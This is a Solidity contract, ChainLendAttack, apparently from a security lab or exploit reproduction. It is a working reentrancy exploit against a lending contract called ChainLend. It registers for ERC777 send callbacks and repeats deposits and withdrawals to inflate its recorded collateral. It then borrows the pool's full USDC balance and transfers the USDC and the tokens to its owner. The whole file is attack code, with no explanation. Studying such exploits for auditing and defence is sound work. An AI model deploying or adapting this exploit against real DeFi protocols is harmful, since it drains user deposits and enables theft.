// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import {ChainLend} from "./ChainLend.sol";

contract ChainLendAttack {
    ChainLend public chainLend;
    address public owner;
    IERC20 public token;
    uint256 public attackCount;
    IERC20 public usdc;

    uint256 private currentimBTCBalance;

    IERC1820Registry private constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor(address _chainLend, address _token, address _usdc) {
        chainLend = ChainLend(_chainLend);
        owner = msg.sender;
        token = IERC20(_token);
        usdc = IERC20(_usdc);

        // Register to receive ERC777 callbacks
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));
    }

    function attack() public {
        token.approve(address(chainLend), type(uint256).max);

        for (uint256 i = 1; i <= 63; i++) {
            currentimBTCBalance = token.balanceOf(address(this));
            chainLend.deposit(currentimBTCBalance - 1);

            chainLend.deposit(1);
        }

        uint256 usdcBalance = usdc.balanceOf(address(chainLend));
        chainLend.borrow(usdcBalance);
        usdc.transfer(owner, usdcBalance);
        currentimBTCBalance = token.balanceOf(address(this));
        token.transfer(owner, currentimBTCBalance);
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        attackCount++;

        if (attackCount % 2 == 0) {
            chainLend.withdraw(currentimBTCBalance - 1);
        }
    }

    function withdrawTokens() public {
        token.transfer(owner, token.balanceOf(address(this)));
    }
}
